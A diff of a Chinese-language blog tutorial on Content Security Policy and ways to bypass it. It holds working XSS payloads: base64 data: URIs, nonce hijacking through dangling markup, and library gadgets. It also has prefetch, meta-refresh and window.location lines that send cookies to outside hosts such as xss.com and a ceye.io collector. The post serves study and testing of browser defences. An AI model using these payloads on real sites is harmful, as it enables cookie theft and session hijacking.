-<p>使用下列js伪协议的payload可以绕过safari（ 12.0.2 ）的csp检测，chrome和firefox不行，猜测可能跟csp检测顺序阶段有关（待深入讨论）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line"></span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==&quot; &gt;test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line"></span><br><span class="line">Bypass CSP by @akita_zen</span><br><span class="line"></span><br><span class="line">Works for CSP like script-src self</span><br></pre></td></tr></table></figure></p>
-<ul>
+<p>使用下列js伪协议的payload可以绕过safari（ 12.0.2 ）的csp检测，chrome和firefox不行，猜测可能跟csp检测顺序阶段有关（待深入讨论）。</p>
+<pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;
+
+&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg==&quot; &gt;test&lt;/a&gt;
+
+&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;
+
+Bypass CSP by @akita_zen
+
+Works for CSP like script-src self
+
+</code></pre><ul>
 <li>允许内联时</li>
 </ul>
 <p>可以正常输入输出测试</p>
@@ -593,31 +661,52 @@
 </ul>
 <p>【1】prefetch 预加载资源-旧版chrome可用</p>
 <p>实现方法： 通过link实现，将rel属性指定为“prefetch”，在href中指定加载资源的地址。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 预加载整个页面 --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.webhek.com/misc/3d-album/&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 预加载一个图片 --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot; http://www.webhek.com/wordpress/</span><br><span class="line">wp-content/uploads/2014/04/b-334x193.jpg &quot; /&gt;</span><br></pre></td></tr></table></figure>
-<p>【2】prerender chrome预渲染-可用</p>
-<p>对对应地址所有资源进行渲染<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prerender&quot; href=&quot;http://linux.im&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>【3】dns-prefetch DNS预解析-可用</p>
-<p>故名思意，DNS预解析 提前将分析页面所需资源域名进行ip转换，使之在请求时尽快完成DNS解析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://linux.im&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>【4】除此之外还有Preconnect(-可用 类似于dns-prefetch，同时会完成握手机制)、subresource、preload<br>这里接触不多，就不一一多提了。</p>
+<pre><code>&lt;!-- 预加载整个页面 --&gt;
+&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.webhek.com/misc/3d-album/&quot; /&gt;
+
+&lt;!-- 预加载一个图片 --&gt;
+&lt;link rel=&quot;prefetch&quot; href=&quot; http://www.webhek.com/wordpress/
+wp-content/uploads/2014/04/b-334x193.jpg &quot; /&gt;
+</code></pre><p>【2】prerender chrome预渲染-可用</p>
+<p>对对应地址所有资源进行渲染</p>
+<pre><code>&lt;link rel=&quot;prerender&quot; href=&quot;http://linux.im&quot;&gt;
+</code></pre><p>【3】dns-prefetch DNS预解析-可用</p>
+<p>故名思意，DNS预解析 提前将分析页面所需资源域名进行ip转换，使之在请求时尽快完成DNS解析。</p>
+<pre><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://linux.im&quot;&gt; 
+</code></pre><p>【4】除此之外还有Preconnect(-可用 类似于dns-prefetch，同时会完成握手机制)、subresource、preload<br>这里接触不多，就不一一多提了。</p>
 <ul>
 <li>2.1.2 预加载的绕过</li>
 </ul>
 <p>回到我们的重点，预加载针对的CSP绕过规则<br>在限制了资源请求时，在xss中想要把cookie传送出去</p>
-<p>限制如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; &quot;);</span><br></pre></td></tr></table></figure></p>
-<p>限制了不可信资源的请求，且不允许内联执行这个时候就可以用预加载方式进行绕过 传出需要的数据<br>如：</p>
-<p>【1】 dns-prefetch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这个时候就可以在ceye上查看相关dns请求记录</p>
-<p>【2】prefetch<br>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>【3】Preconnect、prerender 均测可用，其他的暂未测试。</p>
+<p>限制如下：</p>
+<pre><code>header(&quot;Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; &quot;);
+</code></pre><p>限制了不可信资源的请求，且不允许内联执行这个时候就可以用预加载方式进行绕过 传出需要的数据<br>如：</p>
+<p>【1】 dns-prefetch</p>
+<pre><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;
+</code></pre><p>这个时候就可以在ceye上查看相关dns请求记录</p>
+<p>【2】prefetch<br>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）</p>
+<pre><code>&lt;link rel=&quot;prefetch&quot; href=&quot;http://1221.xxxx.ceye.io&quot;&gt;
+</code></pre><p>【3】Preconnect、prerender 均测可用，其他的暂未测试。</p>
 <p>以下也尚未测试 尴尬 仅摘抄，先写到这吧</p>
 <h6 id="3-url跳转"><a href="#3-url跳转" class="headerlink" title="3 url跳转"></a>3 url跳转</h6><p>在规则限制为 default-src ‘none’的情况下，此时策略为 默认策略 禁止所有资源（不允许加载所有内容）</p>
-<p>可以使用meta标签实现跳转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure></p>
-<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<h6 id="4-利用浏览器补全"><a href="#4-利用浏览器补全" class="headerlink" title="4 利用浏览器补全"></a>4 利用浏览器补全</h6><p>有些网站限制只有某些脚本才能使用，往往会使用<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;;script-src &apos;nonce-abc&apos;</span><br></pre></td></tr></table></figure></p>
-<p>那么当脚本插入点为如下的情况时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>可以插入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//14.rs a=&quot;</span><br><span class="line"></span><br><span class="line">这样会拼成一个新的script标签，其中的src可以自由设定</span><br><span class="line">&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;</span><br><span class="line">&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&apos;CSP&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<h6 id="5-代码重用"><a href="#5-代码重用" class="headerlink" title="5 代码重用"></a>5 代码重用</h6><p>Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库。<br>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
+<p>可以使用meta标签实现跳转</p>
+<pre><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt;
+</code></pre><p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
+<pre><code>&lt;script&gt;
+  window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;
+&lt;/script&gt;
+</code></pre><h6 id="4-利用浏览器补全"><a href="#4-利用浏览器补全" class="headerlink" title="4 利用浏览器补全"></a>4 利用浏览器补全</h6><p>有些网站限制只有某些脚本才能使用，往往会使用<script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：</p>
+<pre><code>Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;
+</code></pre><p>那么当脚本插入点为如下的情况时</p>
+<pre><code>&lt;p&gt;插入点&lt;/p&gt;
+&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;
+</code></pre><p>可以插入</p>
+<pre><code>&lt;script src=//14.rs a=&quot;
+
+这样会拼成一个新的script标签，其中的src可以自由设定
+&lt;p&gt;&lt;script src=//14.rs a=&quot;&lt;/p&gt;
+&lt;script id=&quot;aa&quot; nonce=&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;/script&gt;
+</code></pre><h6 id="5-代码重用"><a href="#5-代码重用" class="headerlink" title="5 代码重用"></a>5 代码重用</h6><p>Blackhat2017上有篇ppt总结了可以被用来绕过CSP的一些JS库。<br>例如假设页面中使用了Jquery-mobile库，并且CSP策略中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，那么下面的向量就可以绕过CSP：</p>
 <div data-role=popup id='<script>alert(1)</script>'>
 
 </p><p>在这个PPT之外的还有一些库也可以被利用，例如RCTF2018中遇到的amp库，下面的标签可以获取名字为FLAG的cookie</p>
@@ -628,414 +717,516 @@
 <p>2.在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如”<a href="http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。" target="_blank" rel="noopener">http://xxx&quot;页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。</a></p>
 <iframe csp="script-src 'unsafe-inline'" src="http://xxx"></iframe>
 
-<h6 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h6><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</span><br><span class="line"></span><br><span class="line">meta可以设置Cookie（Firefox下），可以结合self-xss利用。</span><br><span class="line">&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<h5 id="默认特性"><a href="#默认特性" class="headerlink" title="默认特性"></a>默认特性</h5><ul>
+<h6 id="meta标签"><a href="#meta标签" class="headerlink" title="meta标签"></a>meta标签</h6><p>meta标签有一些不常用的功能有时候有奇效：<br>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。</p>
+<pre><code>&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;
+
+meta可以设置Cookie（Firefox下），可以结合self-xss利用。
+&lt;meta http-equiv=&quot;Set-Cookie&quot; Content=&quot;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/&quot;&gt;
+
+</code></pre><h5 id="默认特性"><a href="#默认特性" class="headerlink" title="默认特性"></a>默认特性</h5><ul>
 <li>阻止内联代码的执行</li>
 <li>eval 相关功能被禁用</li>
 </ul>
-<h5 id="防护问题："><a href="#防护问题：" class="headerlink" title="防护问题："></a>防护问题：</h5><h5 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.ruanyifeng.com/blog/2016/09/csp.html</span><br><span class="line">https://blog.csdn.net/qq_37943295/article/details/79978761</span><br><span class="line">https://paper.seebug.org/423/</span><br><span class="line">https://xz.aliyun.com/t/318</span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line">http://www.webhek.com/post/link-prefetch.html</span><br></pre></td></tr></table></figure>
-<h5 id="存疑"><a href="#存疑" class="headerlink" title="存疑"></a>存疑</h5><p>【1】内联js的定义 <script src=""></script>属于内联还是外联<br>（通俗的来说 内联 即属于script标签内直接调用，外联属于调用外部js）</p>
+<h5 id="防护问题："><a href="#防护问题：" class="headerlink" title="防护问题："></a>防护问题：</h5><h5 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h5><pre><code>http://www.ruanyifeng.com/blog/2016/09/csp.html
+https://blog.csdn.net/qq_37943295/article/details/79978761
+https://paper.seebug.org/423/
+https://xz.aliyun.com/t/318
+https://paper.seebug.org/91/
+http://www.webhek.com/post/link-prefetch.html
+</code></pre><h5 id="存疑"><a href="#存疑" class="headerlink" title="存疑"></a>存疑</h5><p>【1】内联js的定义 <script src=""></script>属于内联还是外联<br>（通俗的来说 内联 即属于script标签内直接调用，外联属于调用外部js）</p>
 
-      
-    </div>
-    
-    
-    
+            </div>
+            <hr/>
 
-    
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
 
-    
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
 
-    
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
 
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/浏览器安全策略/" rel="tag"># 浏览器安全策略</a>
-          
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
         </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/01/01/2019/" rel="next" title="2019">
-                <i class="fa fa-chevron-left"></i> 2019
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/22/移动端/frida1/" rel="prev" title="frida理解与学习">
-                frida理解与学习 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
     </div>
-  </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>Reprint policy</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《安全策略-csp理解与学习》
+                </span> by
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/01/10/安全策略/csp/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                blackj liuyun
+            </a> is licensed under a
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
+                Creative Commons Attribution 4.0 International License
+            </a> 
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
 
 
-          </div>
-          
+        </div>
+    </div>
 
+    
 
-          
+    
 
-  
+    
 
+    
 
+    
 
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2019/01/22/移动端/frida1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="frida理解与学习">
+                        
+                        <span class="card-title">frida理解与学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            【1】pip install frida
+【2】sudo pip install frida-tools
+【3】我这里使用的测试机cpuinfo是
+Processor    : ARMv7 Processor rev 0 (v7l)
+所以下
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-01-22
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            blackj liuyun
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/移动端/" target="_blank">
+                        <span class="chip bg-color">移动端</span>
+                    </a>
+                    
+                    <a href="/tags/frida/" target="_blank">
+                        <span class="chip bg-color">frida</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
         </div>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">blackj liuyun</p>
-              <p class="site-description motion-element" itemprop="description">纯净水@流云-自留地</p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives">
-              
-                  <span class="site-state-item-count">13</span>
-                  <span class="site-state-item-name">日志</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">12</span>
-                  <span class="site-state-item-name">分类</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">16</span>
-                  <span class="site-state-item-name">标签</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#内容安全策略-CSP"><span class="nav-number">1.</span> <span class="nav-text">内容安全策略 CSP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#功能效果"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">功能效果</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CSP和同源策略"><span class="nav-number">1.0.0.1.1.</span> <span class="nav-text">CSP和同源策略</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#使用方式："><span class="nav-number">1.0.0.1.2.</span> <span class="nav-text">使用方式：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#要素"><span class="nav-number">1.0.0.1.2.1.</span> <span class="nav-text">要素</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-header"><span class="nav-number">1.0.0.1.3.</span> <span class="nav-text">http header</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#html中通过meta来限制"><span class="nav-number">1.0.0.1.4.</span> <span class="nav-text">html中通过meta来限制</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构建一下csp-来个例子"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">构建一下csp 来个例子</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#配置"><span class="nav-number">1.0.0.2.1.</span> <span class="nav-text">配置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常见绕过方式"><span class="nav-number">1.0.0.2.2.</span> <span class="nav-text">常见绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-文件上传绕过-只允许加载当前域"><span class="nav-number">1.0.0.2.2.1.</span> <span class="nav-text">1 文件上传绕过  只允许加载当前域</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2、预加载-标签rel属性-绕过只允许加载当前域"><span class="nav-number">1.0.0.2.2.2.</span> <span class="nav-text">2、预加载 标签rel属性 绕过只允许加载当前域</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-url跳转"><span class="nav-number">1.0.0.2.2.3.</span> <span class="nav-text">3 url跳转</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-利用浏览器补全"><span class="nav-number">1.0.0.2.2.4.</span> <span class="nav-text">4 利用浏览器补全</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#iframe"><span class="nav-number">1.0.0.2.2.5.</span> <span class="nav-text">iframe</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#meta标签"><span class="nav-number">1.0.0.2.2.6.</span> <span class="nav-text">meta标签</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#默认特性"><span class="nav-number">1.0.0.2.3.</span> <span class="nav-text">默认特性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#防护问题："><span class="nav-number">1.0.0.2.4.</span> <span class="nav-text">防护问题：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考："><span class="nav-number">1.0.0.2.5.</span> <span class="nav-text">参考：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#存疑"><span class="nav-number">1.0.0.2.6.</span> <span class="nav-text">存疑</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
         
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">blackj liuyun</span>
-
-  
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-area-chart"></i>
-    </span>
-    
-      <span class="post-meta-item-text">Site words total count&#58;</span>
-    
-    <span title="Site words total count">23.7k</span>
-  
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/01/01/2019/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="2019">
+                        
+                        <span class="card-title">2019</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                              随着2018的过去，生活不知不觉的过去的一年，这一年里感觉多多少少还是需要说点啥，先总的一说，总体还是比较满意的，顺利的毕业、顺利的工作，但近段时间以来，感觉个人浮躁了很多，可能是根本就没让自己沉淀下来吧，新的一年，还是给自己树立一个小
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-01-01
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            blackj liuyun
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/生活/" target="_blank">
+                        <span class="chip bg-color">生活</span>
+                    </a>
+                    
+                    <a href="/tags/规划/" target="_blank">
+                        <span class="chip bg-color">规划</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
 </div>
 
 
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
